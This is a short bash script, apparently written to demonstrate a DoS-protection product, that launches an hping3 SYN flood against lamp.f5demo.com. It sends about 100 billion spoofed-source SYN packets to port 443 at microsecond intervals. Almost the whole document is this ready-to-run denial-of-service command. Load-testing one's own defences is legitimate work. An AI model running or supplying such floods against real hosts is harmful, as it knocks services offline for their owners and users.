#!/bin/bash
date
echo "Starting SYN Flood (Dynamic Signature Example): hping3 -c 100000000000 -S -i u5 -p 443 --tos 21 --ttl 33 -I em2 -d 99 --rand-source 10.106.141
.18"
hping3 -c 100000000000 -S -i u5 -p 443 --tos 21 --ttl 33 -I eth1 -d 99 --rand-source lamp.f5demo.com
